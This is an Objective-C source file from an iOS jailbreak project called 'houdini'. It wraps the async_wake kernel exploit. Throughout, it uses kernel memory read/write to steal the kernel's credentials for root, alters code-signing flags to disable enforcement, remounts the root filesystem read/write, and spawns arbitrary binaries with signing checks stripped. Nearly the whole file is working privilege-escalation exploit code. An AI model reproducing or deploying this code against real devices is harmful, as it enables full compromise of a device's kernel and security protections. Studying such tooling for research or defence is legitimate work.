//
//  async_wake_strategy.m
//  houdini
//
//  Created by Abraham Masri on 12/7/17.
//  Copyright © 2017 cheesecakeufo. All rights reserved.
//

#import <Foundation/Foundation.h>
#include "strategy_control.h"
#include "async_wake_strategy.h"
#include "async_wake.h"

#include "kmem.h"
#include "kcall.h"

#include "kutils.h"
#include "symbols.h"

#include "patchfinder64.h"

uint64_t our_proc = 0;
uint64_t our_cred = 0;


/*
 *  Purpose: mounts rootFS as read/write (from to.panga)
 */
kern_return_t mount_rootfs() {
    
    kern_return_t ret = KERN_SUCCESS;
    
    printf("[INFO]: kaslr_slide: %llx\n", kaslr_slide);
    printf("[INFO]: passing kernel_base: %llx\n", kernel_base);
    
    int rv = init_kernel(kernel_base, NULL);
    
    if(rv != 0) {
        printf("[ERROR]: could not initialize kernel\n");
        ret = KERN_FAILURE;
        return ret;
    }
    
    printf("[INFO]: sucessfully initialized kernel\n");
    
    uint64_t rootvnode = find_rootvnode();
    printf("[INFO]: _rootvnode: %llx (%llx)\n", rootvnode, rootvnode - kaslr_slide);
    
    if(rootvnode == 0) {
        ret = KERN_FAILURE;
        return ret;
    }
    
    uint64_t rootfs_vnode = kread_uint64(rootvnode);
    printf("[INFO]: rootfs_vnode: %llx\n", rootfs_vnode);
    
    uint64_t v_mount = kread_uint64(rootfs_vnode + 0xd8);
    printf("[INFO]: v_mount: %llx (%llx)\n", v_mount, v_mount - kaslr_slide);
    
    uint32_t v_flag = kread_uint32(v_mount + 0x71);
    printf("[INFO]: v_flag: %x (%llx)\n", v_flag, v_flag - kaslr_slide);
    
    kwrite_uint32(v_mount + 0x71, v_flag & ~(1 << 6));
    
    
    async_wake_post_exploit(); // set our uid
    
    printf("our uid: %d\n", getuid());
    char *nmz = strdup("/dev/disk0s1s1");
    rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
    
    if(rv == -1) {
        printf("[ERROR]: could not mount '/': %d\n", rv);
    } else {
        printf("[INFO]: successfully mounted '/'\n");
    }
    
    // NOSUID
    uint32_t mnt_flags = kread_uint32(v_mount + 0x70);
    printf("[INFO]: mnt_flags: %x (%llx)\n", mnt_flags, mnt_flags - kaslr_slide);
    
    kwrite_uint32(v_mount + 0x70, mnt_flags & ~(MNT_ROOTFS >> 6));
    
    mnt_flags = kread_uint32(v_mount + 0x70);
    printf("[INFO]: mnt_flags (after kwrite): %x (%llx)\n", mnt_flags, mnt_flags - kaslr_slide);
    
    
    return ret;
}


// kickstarts the exploit
kern_return_t async_wake_start () {
    
    kern_return_t ret = KERN_SUCCESS;
    
    go();
    
    // give ourselves power
    our_proc = get_proc_with_pid(getpid(), false);
    uint32_t csflags = kread_uint32(our_proc + 0x2a8 /* KSTRUCT_OFFSET_CSFLAGS */);
    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD);
    kwrite_uint32(our_proc + 0x2a8 /* KSTRUCT_OFFSET_CSFLAGS */, csflags);
    
    // remount rootFS
    mount_rootfs();
    
    return ret;
}

// called after async_wake_start
kern_return_t async_wake_post_exploit () {
    
    kern_return_t ret = KERN_SUCCESS;
 
    if(our_proc == 0)
        our_proc = get_proc_with_pid(getpid(), false);
    
    if(our_proc == -1) {
        printf("[ERROR]: no our proc. wut\n");
        ret = KERN_FAILURE;
        return ret;
    }
    
    extern uint64_t kernel_task;

    uint64_t kern_ucred = kread_uint64(kernel_task + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);

    
    
    if(our_cred == 0)
        our_cred = kread_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
    
    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
    
    setuid(0);

    
    return ret;
}

/*
 *  Purpose: used as a workaround in iOS 11 (temp till I fix the sandbox panic issue)
 */
void set_cred_back () {
    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, our_cred);
}

void async_wake_mkdir (char *path) {
    
    async_wake_post_exploit();
    mkdir(path, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
    set_cred_back();
    
}


void async_wake_rename (const char *old, const char *new) {

    async_wake_post_exploit();
    rename(old, new);
    set_cred_back();
    
}


void async_wake_unlink (char *path) {

    async_wake_post_exploit();
    unlink(path);
    set_cred_back();
    
}

int async_wake_chown (const char *path, uid_t owner, gid_t group) {
    
    async_wake_post_exploit();
    int ret = chown(path, owner, group);
    set_cred_back();
    return ret;
}


int async_wake_chmod (const char *path, mode_t mode) {
    
    async_wake_post_exploit();
    int ret = chmod(path, mode);
    set_cred_back();
    return ret;
}


int async_wake_open (const char *path, int oflag, mode_t mode) {
    
    async_wake_post_exploit();
    int fd = open(path, oflag, mode);
    set_cred_back();
    
    return fd;
}

void async_wake_kill (pid_t pid, int sig) {
    
    async_wake_post_exploit();
    kill(pid, sig);
    set_cred_back();
}


void async_wake_reboot () {
    
    async_wake_post_exploit();
    reboot(0);
}



void async_wake_posix_spawn (char * path) {

    pid_t pid;
    
    // spawn the given binary
    async_wake_post_exploit();

    int ret = chmod(path, 0777);
    ret = posix_spawn(&pid, path, NULL, NULL, (char **)&(const char*[]){ path, NULL }, NULL);
    
    if(ret != 0) {
        printf("[ERROR]: posix_spawn failed: %d\n", ret);
        goto cleanup;
    }
    
    uint64_t target_proc = get_proc_with_pid(pid, true);
    
    if(target_proc == -1) {
        printf("[ERROR]: could not find spawned binary's pid\n");
        goto cleanup;
    }
    
    // allow the binary to run
    uint32_t csflags = kread_uint32(target_proc + 0x2a8 /* KSTRUCT_OFFSET_CSFLAGS */);
    
    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD);
    kwrite_uint32(target_proc + 0x2a8 /* KSTRUCT_OFFSET_CSFLAGS */, csflags);
    printf("[INFO]: spawned binary: %s", path);
    
    waitpid(pid, NULL, 0);

cleanup:
    set_cred_back();
}


/*
 * Purpose: iterates over the procs and finds a pid with given name
 */
pid_t async_wake_pid_for_name(char *name) {
    
    uint64_t task_self = task_self_addr();
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    
    while (struct_task != 0) {
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        
        if (((bsd_info & 0xffffffffffffffff) != 0xffffffffffffffff)) {
            
            char comm[MAXCOMLEN+1];
            kread(bsd_info + 0x268 /* KSTRUCT_OFFSET_PROC_COMM */, comm, 17);
            
            if(strcmp(name, comm) == 0) {
                
                // get the process pid
                uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
                return (pid_t)pid;
            }
        }
        
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));

        if(struct_task == -1)
            return -1;
    }
    return -1; // we failed :/
}


// returns the async_wake strategy with its functions
strategy async_wake_strategy() {
    
    strategy returned_strategy;
    
    memset(&returned_strategy, 0, sizeof(returned_strategy));
    
    returned_strategy.strategy_start = &async_wake_start;
    returned_strategy.strategy_post_exploit = &async_wake_post_exploit;
    
    returned_strategy.strategy_mkdir = &async_wake_mkdir;
    returned_strategy.strategy_rename = &async_wake_rename;
    returned_strategy.strategy_unlink = &async_wake_unlink;
    
    returned_strategy.strategy_chown = &async_wake_chown;
    returned_strategy.strategy_chmod = &async_wake_chmod;
    
    returned_strategy.strategy_open = &async_wake_open;
    
    returned_strategy.strategy_kill = &async_wake_kill;
    returned_strategy.strategy_reboot = &async_wake_reboot;

    returned_strategy.strategy_posix_spawn = &async_wake_posix_spawn;
    returned_strategy.strategy_pid_for_name = &async_wake_pid_for_name;
    
    return returned_strategy;
}


// custom async_wake stuff

/*
 * Purpose: iterates over the procs and finds a proc with given pid
 */
uint64_t get_proc_with_pid(pid_t target_pid, int spawned) {
    
    uint64_t task_self = task_self_addr();
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    
    while (struct_task != 0) {
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        
        // get the process pid
        uint32_t pid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        
        if(pid == target_pid) {
            return bsd_info;
        }
        
        if(spawned) // spawned binaries will exist AFTER our task
            struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_NEXT));
        else
            struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
        
    }
    return -1; // we failed :/
}
